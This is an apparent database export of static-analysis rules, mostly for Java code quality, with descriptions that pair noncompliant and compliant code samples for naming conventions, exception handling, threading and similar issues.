778	Functions should not have too many lines	S138	\N	javascript	<p>\n  A function that grows too large tends to aggregate too many responsibilities.</br>\n  Such function inevitably become harder to understand and therefore harder to maintain.\n</p>\n<p>\n  Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.\n</p>\n<p>\n  Those smaller functions will not only be easier to understand, but also probably easier to test.\n</p>\n\n<h2>Exceptions</h2>\n<p>\n  This function ignores Immediately Invoked Function Expressions (IIFE), functions which are created and invoked without ever being assigned a name.\n</p>\n<pre>\n (function () { // Ignored by this rule\n\n  function open() {  // Classic function declaration; not ignored\n    // ...\n  }\n\n  function read() {\n    // ...\n  }\n\n  function readlines() {\n    // ...\n  }\n})();\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	brain-overload	f	HTML	1511453807348	1511453807349	1
737	Useless "if(true) {...}" and "if(false){...}" blocks should be removed	S1145	S1145	squid	<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code> statements with conditions that are always true are completely redundant, and make the code less readable.</p>\n<p>There are three possible causes for the presence of such code: </p>\n<ul>\n<li> An if statement was changed during debugging and that debug code has been committed.</li>\n<li> Some value was left unset.</li>\n<li> Some logic is not doing what the programmer thought it did.</li>\n</ul>\n<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (true) {  \n  doSomething(); \n}\n...\nif (false) {  \n  doSomethingElse(); \n}\n\nif (2 &lt; 3 ) { ... }  // Noncompliant; always false\n\nint i = 0;\nint j = 0;\n// ...\nj = foo();\n\nif (j &gt; 0 &amp;&amp; i &gt; 0) { ... }  // Noncompliant; always false - i never set after initialization\n\nboolean b = true;\n//...\nif (b || !b) { ... }  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\ndoSomething(); \n...\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True</li>\n<li> MISRA C:2004, 13.7</li>\n<li> MISRA C:2012, 14.3</li>\n</ul>\n\n<p>This rule is deprecated, use {rule:squid:S2583} instead.</p>	2	\N	DEPRECATED	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cwe,misra	f	HTML	1511453807272	1511453807273	1
738	Collections should not be passed as arguments to their own methods	S2114	S2114	squid	<p>Passing a collection as an argument to the collection's own method is either an error - some other argument was intended - or simply nonsensical code.</p>\n\n<p>Further, because some methods require that the argument remain unmodified during the execution, passing a collection to itself can result in undefined behavior.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nList &lt;Object&gt; objs = new ArrayList&lt;Object&gt;();\n  objs.add("Hello");\n\n  objs.add(objs); // Noncompliant; StackOverflowException if objs.hashCode() called\n  objs.addAll(objs); // Noncompliant; behavior undefined\n  objs.containsAll(objs); // Noncompliant; always true\n  objs.removeAll(objs); // Noncompliant; confusing. Use clear() instead\n  objs.retainAll(objs); // Noncompliant; NOOP\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453807273	1511453807274	2
739	IllegalMonitorStateException should not be caught	S2235	S2235	squid	According to Oracle Javadoc:\n<blockquote>\n<code>IllegalMonitorStateException</code> is thrown when a thread has attempted to wait on an object's monitor or to notify other threads waiting on an object's monitor without owning the specified monitor.\n</blockquote>\n\nIn other words, this exception can be thrown only in case of bad design because <code>Object.wait(...)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> methods should never be called on an object whose monitor is not held. \n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(){\n  ...\n  try {\n    ...\n    anObject.notify();\n    ...\n  } catch(IllegalMonitorStateException e) {\n    ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(){\n  ...\n  synchronized(anObject) {\n    ...\n    anObject.notify();\n    ...\n  }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	multi-threading	f	HTML	1511453807274	1511453807274	2
741	Exit methods should not be called	S1147	S1147	squid	<p>Calling <code>System.exit(int status)</code> or <code>Rutime.getRuntime().exit(int status)</code> calls the shutdown hooks and shuts downs the entire Java virtual machine. Calling <code>Runtime.getRuntime().halt(int)</code> does an immediate shutdown, without calling the shutdown hooks, and skipping finalization.</p>\n<p>Each of these methods should be used with extreme care, and only when the intent is to stop the whole Java process. For instance, none of them should be called from applications running in a J2EE container.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nSystem.exit(0);\nRuntime.getRuntime().exit(0);\nRuntime.getRuntime().halt(0);\n</pre>\n\n<h2>Exceptions</h2>\n<p>These methods are ignored inside <code>main</code>.</p>\n\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/382.html">MITRE, CWE-382</a> - Use of System.exit()</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,suspicious	f	HTML	1511453807275	1511453807276	1
742	"hashCode" and "toString" should not be called on array instances	S2116	S2116	squid	While <code>hashCode</code> and <code>toString</code> are available on arrays, they are largely useless. <code>hashCode</code> returns the array's "identity hash code", and <code>toString</code> returns nearly the same value. Neither method's output actually reflects the array's contents. Instead, you should pass the array to the relevant static <code>Arrays</code> method.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main( String[] args )\n{\n    String argStr = args.toString(); // Noncompliant\n    int argHash = args.hashCode(); // Noncompliant\n\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main( String[] args )\n{\n    String argStr = Arrays.toString(args);\n    int argHash = Arrays.hashCode(args);\n\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807277	1511453807277	2
743	Files should not have too many lines	S00104	S00104	squid	<p>\nA source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.\nAbove a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks.\nThose smaller files will not only be easier to understand but also probably easier to test.\n</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	brain-overload	f	HTML	1511453807277	1511453807278	1
744	Throwable.printStackTrace(...) should not be called	S1148	S1148	squid	<p>\n<code>Throwable.printStackTrace(...)</code> prints a throwable and its stack trace to some stream.\n</p>\n\n<p>Loggers should be used instead to print throwables, as they have many advantages:</p>\n<ul>\n  <li>Users are able to easily retrieve the logs.</li>\n  <li>The format of log messages is uniform and allow users to browse the logs easily.</li>\n</ul>\n\n<p>The following code:</p>\n\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  e.printStackTrace();        // Noncompliant\n}\n</pre>\n\n<p>should be refactored into:</p>\n\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  LOGGER.log("context", e);   // Compliant\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	error-handling	f	HTML	1511453807279	1511453807279	3
745	Methods "wait(...)", "notify()" and "notifyAll()" should never be called on Thread instances	S2236	S2236	squid	<p>On a Thread instance, the methods <code>wait(...)</code>, <code>notify()</code> and <code>notifyAll()</code> are available only because all classes in Java extend <code>Object</code> and therefore automatically inherit the methods. But there are two very good reasons to not call these methods on a Thread instance:</p>\n<ul>\n<li> Doing so is really confusing. What is really expected when calling, for instance, the <code>wait(...)</code> method on a Thread? That the execution of the Thread is suspended, or that acquisition of the object monitor is waited for?</li>\n<li> Internally, the JVM relies on these methods to change the state of the Thread (<code>BLOCKED</code>, <code>WAITING</code>, ...), so calling them will corrupt the behavior of the JVM.</li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nThread myThread = new Thread(new RunnableJob());\n...\nmyThread.wait(2000);\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	multi-threading	f	HTML	1511453807280	1511453807280	2
746	Boolean checks should not be inverted	S1940	S1940	squid	<p>\n  It is needlessly complex to invert the result of a boolean comparison.\n  The opposite comparison should be made instead.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( !(a == 2)) { ...}  // Noncompliant\nboolean b = !(i < 10);  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (a != 2) { ...}\nboolean b = (i >= 10);\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453807281	1511453807281	1
747	Control structures should use curly braces	S00121	S00121	squid	<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n// the two statements seems to be attached to the if statement, but that is only true for the first one:\nif (condition)\n  executeSomething();\n  checkSomething();\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (condition) {\n  executeSomething();\n  checkSomething();\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement\n</li><li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement\n</li><li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement\n</li><li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement\n</li><li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C</a> - Use braces for the body of an if, for, or while statement\n</li><li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation\n</li></ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,misra,pitfall	f	HTML	1511453807282	1511453807282	1
748	Package names should comply with a naming convention	S00120	S00120	squid	<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all package names match a provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default regular expression <code>^[a-z]+(\\.[a-z][a-z0-9]*)*$</code>:</p>\n<pre>\npackage org.exAmple; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npackage org.example; \n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	convention	f	HTML	1511453807282	1511453807283	1
749	Statements should be on separate lines	S00122	S00122	squid	<p>For better readability, do not put more than one statement on a single line.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif(someCondition) doSomething();\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif(someCondition) {\n  doSomething();\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807284	1511453807284	1
750	Limited dependence should be placed on operator precedence rules in expressions	S864	S864	squid	<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex statements. However, this does not mean that parentheses should be gratuitously added around every operation. </p>\n<p>This rule raises issues when <code>&amp;&amp;</code> and <code>||</code> are used in combination, when assignment and equality or relational operators are used in together in a condition, and for other operator combinations according to the following table:</p>\n<table>\n<tr><td> </td><td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td><td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td><td><code>&amp;</code></td><td><code>^</code></td><td><code>|</code></td></tr>\n<tr><td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td><td> </td><td>x</td><td>x</td><td>x</td><td>x</td></tr>\n<tr><td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td><td>x</td><td> </td><td>x</td><td>x</td><td>x</td></tr>\n<tr><td><code>&amp;</code></td><td>x</td><td>x</td><td> </td><td>x</td><td>x</td></tr>\n<tr><td><code>^</code></td><td>x</td><td>x</td><td>x</td><td> </td><td>x</td></tr>\n<tr><td><code>|</code></td><td>x</td><td>x</td><td>x</td><td>x</td><td></td></tr>\n</table>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nx = a + b - c;\nx = a + 1 &lt;&lt; b;  // Noncompliant\n\nif ( a &gt; b || c &lt; d || a == d) {...}\nif ( a &gt; b &amp;&amp; c &lt; d || a == b) {...}  // Noncompliant\nif (a = f(b,c) == 1) { ... } // Noncompliant; == evaluated first\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nx = a + b - c;\nx = (a + 1) &lt;&lt; b;\n\nif ( a &gt; b || c &lt; d || a == d) {...}\nif ( (a &gt; b &amp;&amp; c &lt; d) || a == b) {...}\nif ( (a = f(b,c)) == 1) { ... }\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 12.1 - Limited dependence should be placed on C's operator precedence rules in expressions</li>\n<li> MISRA C++:2008, 5-0-2 - Limited dependence should be placed on C++ operator precedence rules in expressions</li>\n<li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/_wI">CERT EXP00-C</a> - Use parentheses for precedence of operation</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/VoAyAQ">CERT EXP00-CPP</a> - Use parentheses for precedence of operation</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/783.html">MITRE, CWE-783</a> - Operator Precedence Logic Error</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,cwe,misra	f	HTML	1511453807285	1511453807286	1
751	"SingleConnectionFactory" instances should be set to "reconnectOnException"	S3438	S3438	squid	<p>Use of a Spring <code>SingleConnectionFactory</code> without enabling the <code>reconnectOnException</code> setting will prevent automatic connection recovery when the connection goes bad. </p>\n<p>That's because the <code>reconnectOnException</code> property defaults to <code>false</code>. As a result, even if the code that uses this connection factory (Spring's <code>DefaultMessageListenerContainer</code> or your own code) has reconnect logic, that code won't work because the <code>SingleConnectionFactory</code> will act like a single-connection pool by preventing connection <code>close</code> calls from actually closing anything. As a result, subsequent factory <code>create</code> operations will just hand back the original broken <code>Connection</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory"&gt;  &lt;!-- Noncompliant --&gt;\n   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;\n &lt;/bean&gt;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory" p:reconnectOnException="true"&gt;\n   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;\n &lt;/bean&gt;\n</pre>\n<p>or</p>\n<pre>\n &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory"&gt;\n   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;\n   &lt;property name="reconnectOnException"&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;\n &lt;/bean&gt;\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	spring	f	HTML	1511453807286	1511453807287	2
752	Reflection should not be used to check non-runtime annotations	S2109	S2109	squid	<p>The writer of an annotation can set one of three retention policies for it:</p>\n<ul>\n  <li><code>RetentionPolicy.SOURCE</code> - these annotations are dropped during compilation, E.G. <code>@Override</code>, <code>@SuppressWarnings</code>.</li>\n  <li><code>RetentionPolicy.CLASS</code> - these annotations are present in a compiled class but not loaded into the JVM at runtime. This is the default.</li>\n  <li><code>RetentionPolicy.RUNTIME</code> - these annotations are present in the class file and loaded into the JVM.</li>\n</ul>\n<p>Only annotations that have been given a <code>RUNTIME</code> retention policy will be available to reflection. Testing for annotations with any other retention policy is simply\n  an error, since the test will always return false.</p>\n\n<p>This rule checks that reflection is not used to detect annotations that do not have <code>RUNTIME</code> retention.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nMethod m = String.class.getMethod("getBytes", new Class[] {int.class,\nint.class, byte[].class, int.class});\nif (m.isAnnotationPresent(Override.class)) {  // Noncompliant; test will always return false, even when @Override is present in the code\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453807287	1511453807288	2
753	Untrusted data should not be stored in sessions	S3318	S3318	squid	<p>Data in a web session is considered inside the "trust boundary". That is, it is assumed to be trustworthy. But storing unvetted data from an unauthenticated user violates the trust boundary, and may lead that that data being used inappropriately.</p>\n<p>This rule raises an issue when data from <code>Cookie</code>s or <code>HttpServletRequest</code>s is stored in a session. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nlogin = request.getParameter("login");\nsession.setAttribute("login", login);  // Noncompliant\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/501">MITRE, CWE-501</a> - Trust Boundary Violation\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe	f	HTML	1511453807289	1511453807290	3
754	Abstract class names should comply with a naming convention	S00118	S00118	squid	<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all abstract class names match a provided regular expression.</p>\n<p>The following code snippet illustrates this rule:</p>\n<pre>\nabstract class MyClass { // Noncompliant\n}\n\nclass AbstractLikeClass { // Noncompliant\n}\n\nabstract class AbstractClass { // Compliant\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	convention	f	HTML	1511453807290	1511453807290	1
755	Conditions should not unconditionally evaluate to "TRUE" or to "FALSE"	S2583	S2583	squid	<p>\nConditional statements using a condition which cannot be anything but <code>FALSE</code> have the effect of making blocks of code non-functional.\nIf the condition cannot evaluate to anything but <code>TRUE</code>, the conditional statement is completely redundant, and makes the code less readable.\n</p>\n\n<p>\nIt is quite likely that the code does not match the programmer's intent.\n</p>\n\n<p>\nEither the condition should be removed or it should be updated so that it does not always evaluate to <code>TRUE</code> or <code>FALSE</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n//foo can't be both equal and not equal to bar in the same expression\nif(foo == bar && something && foo != bar) {...}\n</pre>\n<pre>\nprivate void compute(int foo) {\n  if (foo == 4) {\n    doSomething();\n    // We know foo is equal to 4 at this point, so the next condition is always false\n    if (foo > 4) {...}\n    ...\n  }\n  ...\n}\n</pre>\n<pre>\nprivate void compute(boolean foo) {\n  if (foo) {\n    return;\n  }\n  doSomething();\n  // foo is always false here\n  if (foo){...}\n  ...\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Leftover Debug Code</li>\n  <li><a href="http://cwe.mitre.org/data/definitions/570">MITRE, CWE-570</a> - Expression is Always False</li>\n  <li><a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True</li>\n  <li>MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted.</li>\n  <li>MISRA C:2012, 14.3 - Controlling expressions shall not be invariant</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cwe,misra	f	HTML	1511453807292	1511453807292	2
756	Local variable and method parameter names should comply with a naming convention	S00117	S00117	squid	<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all local variable and function parameter names match a provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>\n<pre>\npublic void doSomething(int my_param) { \n  int LOCAL;    \n  ...             \n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic void doSomething(int myParam) { \n  int local;  \n  ...               \n}\n</pre>\n\n<h2>Exceptions</h2>\n\n<p>Loop counters are ignored by this rule.</p>\n\n<pre>\nfor (int i = 0; i &lt; limit; i++) {  // Compliant\n  // ...\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807293	1511453807294	1
757	Strings literals should be placed on the left side when checking for equality	S1132	S1132	squid	<p>\nIt is preferable to place string literals on the left-hand side of an <code>equals()</code> or <code>equalsIgnoreCase()</code> method call.\nThis prevents null pointer exceptions from being raised, as a string literal can never be null by definition.\n</p>\n\n<p>The following code:</p>\n\n<pre>\nString myString = null;\n\nSystem.out.println("Equal? " + myString.equals("foo"));                        // Noncompliant - will raise a NPE\nSystem.out.println("Equal? " + (myString != null &amp;&amp; myString.equals("foo")));  // Noncompliant - null check could be removed\n</pre>\n\n<p>should be refactored into:</p>\n\n<pre>\nSystem.out.println("Equal?" + "foo".equals(myString));                         // Compliant - properly deals with the null case\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	bad-practice	f	HTML	1511453807295	1511453807296	1
758	Locks should be released	S2222	S2222	squid	<p>The logic in a method should ensure that locks are released in the methods in which they were acquired. Failure to release a lock increases the potential for deadlocks and could result in runtime errors in production.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyClass {\n  Lock lock = new Lock();\n\n  public void acquireLock() {\n    lock.lock();  // Noncompliant;\n  }\n\n  public void releaseLock() {\n    lock.unlock();\n  }\n\n  public void doTheThing() {\n    acquireLock();\n    // do work...\n    releaseLock();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class MyClass {\n  Lock lock = new Lock();\n\n  public void doTheThing() {\n    lock.lock();\n    // do work...\n    lock.unlock();\n  }\n\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,multi-threading	f	HTML	1511453807296	1511453807296	2
759	Type parameter names should comply with a naming convention	S00119	S00119	squid	<p>Shared naming conventions make it possible for a team to collaborate efficiently. Following the established convention of single-letter type parameter names helps users and maintainers of your code quickly see the difference between a type parameter and a poorly named class.</p>\n\n<p>This rule check that all type parameter names match a provided regular expression. The following code snippets use the default regular expression.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass&lt;TYPE&gt; { // Noncompliant\n  &lt;TYPE&gt; void method(TYPE t) { // Noncompliant\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass&lt;T&gt; {\n  &lt;T&gt; void method(T t) {\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	convention	f	HTML	1511453807297	1511453807297	1
761	"Exception" should not be caught when not required by called methods	S2221	S2221	squid	<p>\n  Catching <code>Exception</code> seems like an efficient way to handle multiple possible exceptions.\n  Unfortunately, it traps all exception types and so both checked and runtime exceptions, casting too broad a net.\n  Indeed, was it really the intention of developers to also catch runtime exceptions? To prevent any misunderstanding,\n  if both checked and runtime exceptions are really expected to be caught, they should be explicitly listed in the <code>catch</code> clause.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  // do something that might throw an UnsupportedDataTypeException or UnsupportedEncodingException\n} catch (Exception e) { // Noncompliant\n  // log exception ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  // do something\n} catch (UnsupportedEncodingException|UnsupportedDataTypeException|RuntimeException e) {\n  // log exception ...\n}\n</pre>\n<p>or if runtime exceptions should not be caught:</p>\n<pre>\ntry {\n  // do something\n} catch (UnsupportedEncodingException|UnsupportedDataTypeException e) {\n  // log exception ...\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>No issue is raised if a method in the <code>try</code> block explicitly throws an <code>Exception</code>.</p>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cwe,error-handling	f	HTML	1511453807300	1511453807300	3
762	Interface names should comply with a naming convention	S00114	S00114	squid	<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all interface names match a provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>\n<pre>\npublic interface myInterface {...} // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic interface MyInterface {...}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	convention	f	HTML	1511453807301	1511453807301	1
763	"FIXME" tags should be handled	S1134	S1134	squid	<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>\n<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>\n<p>This rule is meant to track those tags, and ensure that they do not go unnoticed.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nint divide(int numerator, int denominator) {\n  return numerator / denominator;              // FIXME denominator value might be  0\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	f	HTML	1511453807303	1511453807303	1
764	Files should contain an empty new line at the end	S00113	S00113	squid	<p>Some tools such as Git work better when files end with an empty line.</p>\n<p>This rule simply generates an issue if it is missing.</p>\n<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>\n<pre>\n+class Test {\n+}\n\\ No newline at end of file\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807303	1511453807304	1
765	"TODO" tags should be handled	S1135	S1135	squid	<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>\n<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>\n<p>This rule is meant to track those tags, and ensure that they do not go unnoticed.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvoid doSomething() {\n  // TODO\n}\n</pre>	0	\N	READY	java	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	f	HTML	1511453807304	1511453807304	1
766	Field names should comply with a naming convention	S00116	S00116	squid	<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field names match a provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>\n<pre>\nclass MyClass {\n   private int my_field;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {\n   private int myField;\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807305	1511453807305	1
767	Servlets should not have mutable instance fields	S2226	S2226	squid	<p>By contract, a servlet container creates one instance of each servlet and then a dedicated thread is attached to each new incoming HTTP request to process this request. So all threads are sharing the servlet instances and by extension instance fields.  To prevent any misunderstanding and unexpected behavior at runtime, all servlet fields should then be either <code>static</code> and/or <code>final</code>, or simply removed.</p>\n<p>With Struts 1.X, the same constraint exists on <code>org.apache.struts.action.Action</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyServlet extends HttpServlet {\n  private String userName;  //As this field is shared by all users, it's obvious that this piece of information should be managed differently\n  ...\n}\n</pre>\n<p>or </p>\n<pre>\npublic class MyAction extends Action {\n  private String userName;  //Same reason\n  ...\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cert,multi-threading,struts	f	HTML	1511453807307	1511453807308	2
768	Constant names should comply with a naming convention	S00115	S00115	squid	<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all constant names match a provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>\n<pre>\npublic class MyClass {\n  public static final int first = 1;\n}\n\npublic enum MyEnum {\n  first;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class MyClass {\n  public static final int FIRST = 1; \n}\n\npublic enum MyEnum {\n  FIRST;\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807308	1511453807309	1
